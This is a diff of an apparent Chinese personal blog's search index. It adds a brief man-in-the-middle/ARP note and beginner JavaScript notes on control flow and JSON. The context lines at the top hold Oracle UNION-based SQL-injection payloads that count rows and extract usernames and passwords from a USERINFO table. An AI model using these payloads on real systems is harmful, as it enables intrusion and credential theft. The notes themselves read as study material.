@@ -149,6 +149,8 @@ id=-1 union select database()
 <h3 id="查看表的记录数"><a href="#查看表的记录数" class="headerlink" title="查看表的记录数"></a>查看表的记录数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,count(*)||&apos;&apos;,null,null,null,null from USERINFO</div></pre></td></tr></table></figure>
 <h3 id="查看第一条记录"><a href="#查看第一条记录" class="headerlink" title="查看第一条记录"></a>查看第一条记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,USER_ACCOUNT,null,null,null,null from(select rownum aa,USER_ACCOUNT from USERINFO)where aa=1</div></pre></td></tr></table></figure>
 <h3 id="查看密码"><a href="#查看密码" class="headerlink" title="查看密码"></a>查看密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">id=-1 union select null,null,null,null,null,null,null,null,PASSWORD,null,null,null,null from(select rownum aa,PASSWORD from USERINFO)where aa=1</div></pre></td></tr></table></figure>
+<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>会话劫持</p>
+<p>arp -a:显示本地arp缓存<br>arp -d * 清空缓存<br>arp -s 绑定</p>
 ]]></content>
     </entry>
     
@@ -422,6 +424,52 @@ var iNum1 = parseInt(&quot;red&quot;);    //返回 NaN  Not a number
 </tr>
 </tbody>
 </table>
+<h2 id="程序流程控制"><a href="#程序流程控制" class="headerlink" title="程序流程控制"></a>程序流程控制</h2><h3 id="判断-if、switch、"><a href="#判断-if、switch、" class="headerlink" title="判断(if、switch、?:)"></a>判断(if、switch、?:)</h3><ul>
+<li><p>if</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">if()</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(条件1)</div><div class="line">&#123;</div><div class="line">	语句1</div><div class="line">&#125;</div><div class="line">else if(条件2)</div><div class="line">&#123;</div><div class="line">	语句2</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	语句n</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>switch</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">switch(变量)</div><div class="line">&#123;</div><div class="line">	case 值1:</div><div class="line">		语句1</div><div class="line">		break;</div><div class="line">	case 值2:</div><div class="line">		语句2</div><div class="line">		break;</div><div class="line">	......</div><div class="line">	default:</div><div class="line">		语句n</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>三目条件运算符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">条件?语句1:语句2</div><div class="line"></div><div class="line">if(条件)</div><div class="line">&#123;</div><div class="line">	语句1</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">	语句2</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="循环-while、for"><a href="#循环-while、for" class="headerlink" title="循环(while、for)"></a>循环(while、for)</h3><ul>
+<li>while、for<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">while(条件)</div><div class="line">&#123;</div><div class="line">	语句</div><div class="line">&#125;</div><div class="line">   </div><div class="line">   </div><div class="line">   for循环</div><div class="line"></div><div class="line">for(初始化;条件;自增)</div><div class="line">&#123;</div><div class="line">	语句</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="跳出-break、continue"><a href="#跳出-break、continue" class="headerlink" title="跳出(break、continue)"></a>跳出(break、continue)</h3><ul>
+<li><p>continue 语句中断循环中的迭代，如果出现了指定的条件，然后继续循环中的下一个迭代。</p>
+</li>
+<li><p>break 语句可用于跳出循环。break 语句跳出循环后，会继续执行该循环之后的代码（如果有的话）</p>
+</li>
+</ul>
+<h3 id="什么是真、什么是假"><a href="#什么是真、什么是假" class="headerlink" title="什么是真、什么是假"></a>什么是真、什么是假</h3><ul>
+<li>真：true、非零数字、非空字符串、非空对象</li>
+<li>假：false、数字零、空字符串、空对象、undefined</li>
+</ul>
+<h2 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h2><h3 id="Json-1"><a href="#Json-1" class="headerlink" title="Json"></a>Json</h3><ul>
+<li><p>JSON：JavaScript 对象表示法（JavaScript Object Notation）。</p>
+</li>
+<li><p>JSON 是存储和交换文本信息的语法。类似 XML。</p>
+</li>
+<li><p>JSON 比 XML 更小、更快，更易解析。</p>
+</li>
+</ul>
+<h3 id="Json与数组区别"><a href="#Json与数组区别" class="headerlink" title="Json与数组区别"></a>Json与数组区别</h3><ul>
+<li><p>下标：Json下标为字符，数组下标为数字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var json=&#123;a: 12, b: 5, c: 7&#125;;</div><div class="line">var arr=[12, 5, 7];</div><div class="line"></div><div class="line">alert(json[&apos;a&apos;]);</div><div class="line">alert(arr[0]);</div></pre></td></tr></table></figure>
+</li>
+<li><p>.length</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alert(json.length);     错误，json没有length</div><div class="line">alert(arr.length);	  正确，而数组有length</div></pre></td></tr></table></figure>
+<ul>
+<li>循环</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">for(var i=0;i&lt;arr.length;i++)</div><div class="line">&#123;</div><div class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+arr[i]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">for(var i in arr)</div><div class="line">&#123;</div><div class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+arr[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="Json和for-in"><a href="#Json和for-in" class="headerlink" title="Json和for in"></a>Json和for in</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">for(var i in json)</div><div class="line">&#123;</div><div class="line">	alert(&apos;第&apos;+i+&apos;个东西：&apos;+json[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 ]]></content>
     </entry>
     
